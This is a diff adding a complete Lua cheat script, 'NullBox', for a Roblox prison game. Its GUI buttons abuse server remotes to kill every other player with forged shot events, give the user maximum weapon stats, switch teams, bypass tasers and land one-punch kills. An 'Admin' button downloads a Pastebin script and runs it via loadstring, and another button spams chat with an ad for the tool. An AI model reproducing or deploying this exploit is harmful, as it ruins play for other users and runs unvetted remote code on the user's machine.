@@ -1,0 +1,302 @@
+pcall(function()
+game.CoreGui.RobloxPromptGui:Remove()
+end)
+local function CreateInstance(cls,props)
+local inst = Instance.new(cls)
+for i,v in pairs(props) do
+	inst[i] = v
+end
+return inst
+end
+	
+local MainGui = CreateInstance('ScreenGui',{DisplayOrder=0,Enabled=true,ResetOnSpawn=false,Name='MainGui', Parent=game.CoreGui})
+local MainFrame = CreateInstance('ScrollingFrame',{BottomImage='rbxasset://textures/ui/Scroll/scroll-bottom.png',CanvasPosition=Vector2.new(0, 0),CanvasSize=UDim2.new(0, 0, 2, 0),MidImage='rbxasset://textures/ui/Scroll/scroll-middle.png',ScrollBarThickness=5,ScrollingEnabled=true,TopImage='rbxasset://textures/ui/Scroll/scroll-top.png',Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(0.00100000005, 228, 0.00100000005, 502),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='MainFrame',Parent = MainGui})
+local KillAll = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Kill All',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='KillAll',Parent = MainFrame})
+local GetAllWeapons = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Get Weapons',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.0308764949, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='GetAllWeapons',Parent = MainFrame})
+local ChangeToNeutral = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Team: Neutral',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.0617529899, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ChangeToNeutral',Parent = MainFrame})
+local ChangeToCriminal = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Team: Criminal',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.0926294848, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ChangeToCriminal',Parent = MainFrame})
+local ChangeToGuards = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Team: Guards',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.12350598, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ChangeToGuards',Parent = MainFrame})
+local ChangeToPrisoners = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Team: Prisoners',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.154382467, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ChangeToPrisoners',Parent = MainFrame})
+local ModGuns = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Mod Guns',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.185258955, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='ModGuns',Parent = MainFrame})
+local Teleport_Prison = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Teleport: Prison',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.216135442, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='Teleport: Prison',Parent = MainFrame})
+local Teleport_Yard = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Teleport: Yard',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.24701193, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='Teleport: Yard',Parent = MainFrame})
+local HeadSizer = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Head Sizer',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.277888417, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='HeadSizer',Parent = MainFrame})
+local TazerBypazz = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Tazer Bypass',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.308764905, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='TazerBypazz',Parent = MainFrame})
+local OnePunch = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='One Punch',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.0174865685, 0, 0.343625456, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='OnePunch',Parent = MainFrame})
+local Chat_Spam = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Chat Spam',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-5.72912395e-05, 0, 0.402390391, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='Chat Spam',Parent = MainFrame})
+local FE_God = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='FE God (Beta)',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-5.72912395e-05, 0, 0.433266878, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='FE God',Parent = MainFrame})
+local UIS = game:GetService("UserInputService")
+local Admin = CreateInstance('TextButton',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size24,Text='Admin',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=20,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,AutoButtonColor=true,Modal=false,Selected=false,Style=Enum.ButtonStyle.Custom,Active=true,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(0.137255, 0.137255, 0.137255),BackgroundTransparency=0,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-5.72912395e-05, 0, 0.435258925, 0),Rotation=0,Selectable=true,Size=UDim2.new(0, 220, 0, 31),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name=' Admin',Parent = MainFrame})
+
+UIS.InputBegan:Connect(function(input)
+	if input.KeyCode == Enum.KeyCode.Delete then
+		if MainFrame.Position == UDim2.new(0,0,0,0) then
+			MainFrame:TweenPosition(UDim2.new(0,-230,0,0))
+			game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+		else
+			if MainFrame.Position == UDim2.new(0,-230,0,0) then
+				MainFrame:TweenPosition(UDim2.new(0,0,0,0))
+				game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,true)
+			end
+		end
+	end
+end)
+
+ModGuns.MouseButton1Click:Connect(function()
+local Ak = require(game.Players.LocalPlayer.Backpack["AK-47"].GunStates)
+Ak["Range"] = math.huge
+Ak["CurrentAmmo"] = math.huge
+Ak["Bullets"] = 15
+Ak["AutoFire"] = true
+Ak["FireRate"] = 0
+Ak["MaxAmmo"] = math.huge
+Ak["Spread"] = 0
+Ak["Damage"] = 9991
+Ak["StoredAmmo"] = math.huge
+Ak["ReloadTime"] = 0.001
+local Re = require(game.Players.LocalPlayer.Backpack["Remington 870"].GunStates)
+Re["Range"] = math.huge
+Re["CurrentAmmo"] = math.huge
+Re["Bullets"] = 15
+Re["AutoFire"] = true
+Re["FireRate"] = 0
+Re["MaxAmmo"] = math.huge
+Re["Spread"] = 0
+Re["Damage"] = 9991
+Re["StoredAmmo"] = math.huge
+Re["ReloadTime"] = 0.001
+local M9 = require(game.Players.LocalPlayer.Backpack["M9"].GunStates)
+M9["Range"] = math.huge
+M9["CurrentAmmo"] = math.huge
+M9["Bullets"] = 15
+M9["AutoFire"] = true
+M9["FireRate"] = 0
+M9["MaxAmmo"] = math.huge
+M9["Spread"] = 0
+M9["Damage"] = 9991
+M9["StoredAmmo"] = math.huge
+M9["ReloadTime"] = 0.001
+pcall(function()
+local Ta = require(game.Players.LocalPlayer.Backpack["Tazer"].GunStates)
+Ta["Range"] = math.huge
+Ta["CurrentAmmo"] = math.huge
+Ta["Bullets"] = 15
+Ta["AutoFire"] = true
+Ta["FireRate"] = 0
+Ta["MaxAmmo"] = math.huge
+Ta["Spread"] = 0
+Ta["Damage"] = 9991
+Ta["StoredAmmo"] = math.huge
+Ta["ReloadTime"] = 0.001 
+end)
+end)
+
+GetAllWeapons.MouseButton1Click:Connect(function()
+	for i,v in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
+workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
+end
+end)
+
+ChangeToNeutral.MouseButton1Click:Connect(function()
+workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+end)
+
+KillAll.MouseButton1Click:Connect(function()
+local function wee()
+workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+ 
+game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+ 
+wait(0.5)
+local function kill(a)
+local A_1 =
+{
+[1] =
+{
+["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)),
+["Distance"] = 3.2524313926697,
+["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576),
+["Hit"] = a.Character.Head
+},
+  [2] =
+{
+["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)),
+["Distance"] = 3.2699294090271,
+["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377),
+["Hit"] = a.Character.Head
+},
+[3] =
+{
+["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)),
+["Distance"] = 3.1665518283844,
+["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652),
+["Hit"] = a.Character.Head
+},
+[4] =
+{
+["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)),
+["Distance"] = 3.3218522071838,
+["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611),
+["Hit"] = a.Character.Head
+},
+[5] =
+{
+["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)),
+["Distance"] = 3.222757101059,
+["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302),
+["Hit"] = a.Character.Head
+}
+}
+local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
+local Event = game:GetService("ReplicatedStorage").ShootEvent
+Event:FireServer(A_1, A_2)
+Event:FireServer(A_1, A_2)
+end
+ 
+for i,v in pairs(game.Players:GetChildren())do
+if v.Name ~= game.Players.LocalPlayer.Name then
+kill(v)
+end
+end
+wait(1)
+workspace.Remote.TeamEvent:FireServer("Bright orange")
+end
+end)
+
+ChangeToCriminal.MouseButton1Click:Connect(function()
+local lastpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-976.125183, 109.123924, 2059.99536)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastpos
+end)
+
+ChangeToGuards.MouseButton1Click:Connect(function()
+workspace.Remote.TeamEvent:FireServer("Bright blue")
+end)
+
+ChangeToPrisoners.MouseButton1Click:Connect(function()
+workspace.Remote.TeamEvent:FireServer("Bright orange")
+end)
+
+HeadSizer.MouseButton1Click:Connect(function()
+for i,v in pairs(workspace:GetChildren()) do
+if v.Name ~= game.Players.LocalPlayer.Name then
+if v:FindFirstChild("Head") then
+v.Head.Size = Vector3.new(21,21,21)
+v.Head.Mesh:Remove()
+end
+end
+end
+end)
+
+Teleport_Prison.MouseButton1Click:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 99, 2471)
+end)
+
+Teleport_Yard.MouseButton1Click:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(713, 97, 2470)
+end)
+
+TazerBypazz.MouseButton1Click:Connect(function()
+game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+  game.Players.LocalPlayer.CharacterAdded:connect(function()
+  game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+  game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+end)
+end)
+
+OnePunch.MouseButton1Click:Connect(function()
+mainRemotes = game.ReplicatedStorage
+meleeRemote = mainRemotes['meleeEvent']
+mouse = game.Players.LocalPlayer:GetMouse()
+punching = false
+cooldown = false
+
+function punch()
+cooldown = true
+local part = Instance.new("Part", game.Players.LocalPlayer.Character)
+part.Transparency = 1
+part.Size = Vector3.new(5, 2, 3)
+part.CanCollide = false
+local w1 = Instance.new("Weld", part)
+w1.Part0 = game.Players.LocalPlayer.Character.Torso
+w1.Part1 = part
+w1.C1 = CFrame.new(0,0,2)
+part.Touched:connect(function(hit)
+if game.Players:FindFirstChild(hit.Parent.Name) then
+local plr = game.Players:FindFirstChild(hit.Parent.Name)
+if plr.Name ~= game.Players.LocalPlayer.Name then
+part:Destroy()
+
+for i = 1,100 do
+meleeRemote:FireServer(plr)
+end
+end
+end
+end)
+
+wait(1)
+cooldown = false
+part:Destroy()
+end
+
+
+mouse.KeyDown:connect(function(key)
+if cooldown == false then
+if key:lower() == "f" then
+
+punch()
+
+end
+end
+end)
+end)
+
+Admin.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/tzTXmYf2'),true))()
+end)
+function chat(text)
+	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text,"All")
+end
+
+Chat_Spam.MouseButton1Click:Connect(function()
+while _G.Spammer and wait(3) do
+chat("Are you tired, of those 11's, do you wanna have some fun again? So why stay legit, when you can have more skill! Get NullBox Pre v2 today! github , com / xXTevinOfficialXx / NullBox")
+end
+end)
+
+local store = Instance.new("Folder",game)
+local god = false
+local newhumanoid = nil
+local hum = nil
+
+FE_God.MouseButton1Click:Connect(function()
+if god == false then
+hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+god = true
+hum.Parent = store
+newhumanoid = hum:Clone()
+newhumanoid.Parent = game.Players.LocalPlayer.Character
+else
+if god == true then
+newhumanoid:Destroy()
+hum.Parent = game.Players.LocalPlayer.Character
+god = false
+end
+end
+end)
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+god = false
+hum = nil
+newhumanoid = nil
+for i,v in pairs(store:GetChildren())do
+v:Destroy()
+end
+end)
+
+game.StarterGui:SetCore("SendNotification",{
+Text = "NullBox attached",
+Title = "NullBox",
+Duration = 5
+})
